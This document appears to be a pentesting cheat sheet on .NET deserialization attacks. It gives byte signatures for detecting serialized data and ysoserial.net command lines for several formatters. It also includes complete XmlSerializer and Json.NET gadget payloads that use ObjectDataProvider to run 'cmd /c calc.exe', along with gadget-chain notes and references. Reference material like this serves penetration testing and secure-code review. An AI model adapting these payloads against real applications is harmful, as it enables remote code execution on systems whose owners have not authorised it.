# .net deserialization

> .net serialization is the process of converting an object’s state into a format that can be easily stored or transmitted, such as xml, json, or binary. this serialized data can then be saved to a file, sent over a network, or stored in a database. later, it can be deserialized to reconstruct the original object with its data intact. serialization is widely used in .net for tasks like caching, data transfer between applications, and session state management.


## summary

* [detection](#detection)
* [tools](#tools)
* [formatters](#formatters)
    * [xmlserializer](#xmlserializer)
    * [datacontractserializer](#datacontractserializer)
    * [netdatacontractserializer](#netdatacontractserializer)
    * [losformatter](#losformatter)
    * [json.net](#jsonnet)
    * [binaryformatter](#binaryformatter)
* [pop gadgets](#pop-gadgets)
* [references](#references)


## detection

| data           | description         |
| -------------- | ------------------- |
| `aaeaad` (hex) | .net binaryformatter |
| `ff01` (hex)   | .net viewstate |
| `/w` (base64)   | .net viewstate |

example: `aaeaaad/////aqaaaaaaaaamagaaaf9texn0zw0u[...]0kpc9pympzpgs=`


## tools

* [pwntester/ysoserial.net - deserialization payload generator for a variety of .net formatters](https://github.com/pwntester/ysoserial.net)
```ps1
$ cat my_long_cmd.txt | ysoserial.exe -o raw -g windowsidentity -f json.net -s
$ ./ysoserial.exe -p dotnetnuke -m read_file -f win.ini
$ ./ysoserial.exe -f json.net -g objectdataprovider -o raw -c "calc" -t
$ ./ysoserial.exe -f binaryformatter -g psobject -o base64 -c "calc" -t
```

## formatters


[image extracted text: [image not found]]
    
.net native formatters from [pwntester/attacking-net-serialization](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15)


### xmlserializer

* in c# source code, look for `xmlserializer(typeof(<type>));`.
* the attacker must control the **type** of the xmlserializer.
* payload output: **xml**

```xml
.\ysoserial.exe -g objectdataprovider -f xmlserializer -c "calc.exe"
<?xml version="1.0"?>
<root type="system.data.services.internal.expandedwrapper`2[[system.windows.markup.xamlreader, presentationframework, version=4.0.0.0, culture=neutral, publickeytoken=31bf3856ad364e35],[system.windows.data.objectdataprovider, presentationframework, version=4.0.0.0, culture=neutral, publickeytoken=31bf3856ad364e35]], system.data.services, version=4.0.0.0, culture=neutral, publickeytoken=b77a5c561934e089">
    <expandedwrapperofxamlreaderobjectdataprovider xmlns:xsi="http://www.w3.org/2001/xmlschema-instance" xmlns:xsd="http://www.w3.org/2001/xmlschema" >
        <expandedelement/>
        <projectedproperty0>
            <methodname>parse</methodname>
            <methodparameters>
                <anytype xmlns:xsi="http://www.w3.org/2001/xmlschema-instance" xmlns:xsd="http://www.w3.org/2001/xmlschema" xsi:type="xsd:string">
                    <![cdata[<resourcedictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:system;assembly=mscorlib" xmlns:c="clr-namespace:system.diagnostics;assembly=system"><objectdataprovider d:key="" objecttype="{d:type c:process}" methodname="start"><objectdataprovider.methodparameters><b:string>cmd</b:string><b:string>/c calc.exe</b:string></objectdataprovider.methodparameters></objectdataprovider></resourcedictionary>]]>
                </anytype>
            </methodparameters>
            <objectinstance xsi:type="xamlreader"></objectinstance>
        </projectedproperty0>
    </expandedwrapperofxamlreaderobjectdataprovider>
</root>
```


### datacontractserializer

> the datacontractserializer deserializes in a loosely coupled way. it never reads common language runtime (clr) type and assembly names from the incoming data. the security model for the xmlserializer is similar to that of the datacontractserializer, and differs mostly in details. for example, the xmlincludeattribute attribute is used for type inclusion instead of the knowntypeattribute attribute.

* in c# source code, look for `datacontractserializer(typeof(<type>))`.
* payload output: **xml**
* data **type** must be user-controlled to be exploitable


### netdatacontractserializer 

> it extends the `system.runtime.serialization.xmlobjectserializer` class and is capable of serializing any type annotated with serializable attribute as `binaryformatter`.

* in c# source code, look for `netdatacontractserializer().readobject()`.
* payload output: **xml**

```ps1
.\ysoserial.exe -f netdatacontractserializer -g typeconfusedelegate -c "calc.exe" -o base64 -t
```


### losformatter

* use `binaryformatter` internally.

```ps1
.\ysoserial.exe -f losformatter -g typeconfusedelegate -c "calc.exe" -o base64 -t
```


### json.net

* in c# source code, look for `jsonconvert.deserializeobject<expected>(json, new jsonserializersettings`.
* payload output: **json**

```ps1
.\ysoserial.exe -f json.net -g objectdataprovider -o raw -c "calc.exe" -t
{
    '$type':'system.windows.data.objectdataprovider, presentationframework, version=4.0.0.0, culture=neutral, publickeytoken=31bf3856ad364e35', 
    'methodname':'start',
    'methodparameters':{
        '$type':'system.collections.arraylist, mscorlib, version=4.0.0.0, culture=neutral, publickeytoken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'objectinstance':{'$type':'system.diagnostics.process, system, version=4.0.0.0, culture=neutral, publickeytoken=b77a5c561934e089'}
}
```


### binaryformatter

> the binaryformatter type is dangerous and is not recommended for data processing. applications should stop using binaryformatter as soon as possible, even if they believe the data they're processing to be trustworthy. binaryformatter is insecure and can’t be made secure.

* in c# source code, look for `system.runtime.serialization.binary.binaryformatter`.
* exploitation requires `[serializable]` or `iserializable` interface.
* payload output: **binary**


```ps1
./ysoserial.exe -f binaryformatter -g psobject -o base64 -c "calc" -t
```


## pop gadgets

these gadgets must have the following properties:

* serializable
* public/settable variables
* magic "functions": get/set, onserialisation, constructors/destructors

you must carefully select your **gadgets** for a targeted **formatter**.


list of popular gadgets used in common payloads.
* **objectdataprovider** from `c:\windows\microsoft.net\framework\v4.0.30319\wpf\presentationframework.dll`
    * use `methodparameters` to set arbitrary parameters
    * use `methodname` to call an arbitrary function 
* **expandedwrapper**
    * specify the `object types` of the objects that are encapsulated
    ```cs
    expandedwrapper<process, objectdataprovider> myexpwrap = new expandedwrapper<process, objectdataprovider>();
    ```
* **system.configuration.install.assemblyinstaller**
    * execute payload with assembly.load   
    ```cs
    // system.configuration.install.assemblyinstaller
    public void set_path(string value){
        if (value == null){
            this.assembly = null;
        }
        this.assembly = assembly.loadfrom(value);
    }
    ```


## references

- [are you my type? breaking .net sandboxes through serialization - slides - james forshaw - september 20, 2012](https://media.blackhat.com/bh-us-12/briefings/forshaw/bh_us_12_forshaw_are_you_my_type_slides.pdf)
- [are you my type? breaking .net sandboxes through serialization - white paper - james forshaw - september 20, 2012](https://media.blackhat.com/bh-us-12/briefings/forshaw/bh_us_12_forshaw_are_you_my_type_wp.pdf)
- [attacking .net deserialization - alvaro muñoz - april 28, 2018](https://youtu.be/edfgpu3ie4q)
- [attacking .net serialization - alvaro - october 20, 2017](https://speakerdeck.com/pwntester/attacking-net-serialization?slide=11)
- [basic .net deserialization (objectdataprovider gadget, expandedwrapper, and json.net) - hacktricks - july 18, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net)
- [bypassing .net serialization binders - markus wulftange - june 28, 2022](https://codewhitesec.blogspot.com/2022/06/bypassing-dotnet-serialization-binders.html)
- [exploiting deserialisation in asp.net via viewstate - soroush dalili (@irsdl) - april 23, 2019](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [finding a new datacontractserializer rce gadget chain - dugisec - november 7, 2019](https://muffsec.com/blog/finding-a-new-datacontractserializer-rce-gadget-chain/)
- [friday the 13th: json attacks - def con 25 conference - alvaro muñoz (@pwntester) and oleksandr mirosh - july 22, 2017](https://www.youtube.com/watch?v=zbfbyok_wr0)
- [friday the 13th: json attacks - slides - alvaro muñoz (@pwntester) and oleksandr mirosh - july 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-munoz-friday-the-13th-json-attacks.pdf)
- [friday the 13th: json attacks - white paper - alvaro muñoz (@pwntester) and oleksandr mirosh - july 22, 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-munoz-friday-the-13th-json-attacks-wp.pdf)
- [now you serial, now you don't - systematically hunting for deserialization exploits - alyssa rahman - december 13, 2021](https://www.mandiant.com/resources/blog/hunting-deserialization-exploits)
- [sitecore experience platform pre-auth rce - cve-2021-42237 - shubham shah - november 2, 2021](https://blog.assetnote.io/2021/11/02/sitecore-rce/)